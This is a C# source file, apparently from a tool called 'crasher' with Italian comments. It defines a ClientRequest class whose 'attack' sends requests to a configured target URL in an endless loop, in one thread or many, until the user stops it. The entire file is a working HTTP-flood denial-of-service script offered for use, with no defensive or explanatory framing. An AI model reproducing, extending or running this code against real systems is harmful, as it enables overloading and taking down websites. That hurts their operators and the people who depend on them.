﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using crasher.Model;

namespace crasher.Attacks
{
    public static class ClientRequest
    {
        private static WebClient client = new WebClient();
        private static Thread[] threads;
        private static bool stopFlag = false;
        /**
         * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
         * **/
        public static void Start()
        {
            if (AttackSettings.Threading)
            {
                threads = new Thread[AttackSettings.Threads];
                StartAsyncAttack();
            }
            else
            {
                stopFlag = false;
                StartAttack();
            }

            Console.WriteLine("Started client attack");
        }

        /**
         * Attacco sfruttando i thread
         * **/
        private static void StartAsyncAttack()
        {
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i] = new Thread(StartAttack);
                threads[i].Start();
            }
        }

        /**
         * Attacco utilizzando nessun thread.
         * **/
        private static void StartAttack()
        {
            while (true)
            {
                if (stopFlag)
                {
                    break;
                }
                client.DownloadString(AttackSettings.Url);
            }
        }

        /**
         * Ferma l'attacco a seconda del tipo utilizzato
         * **/
        public static void Stop() {
            if (AttackSettings.Threading)
                StopAsyncAttack();
            else
                StopAttack();
        }

        /**
         * Ferma l'attacco senza thread utilizzando un flag che genera un break
         */
        private static void StopAttack()
        {
            stopFlag = true;
        }

        /**
        * Esegue l'abort su tutti i thread.
        * **/
        private static void StopAsyncAttack() {
            foreach (Thread thread in threads) {
                thread.Abort("Stopped attack by user");
            }
        }
    }
}
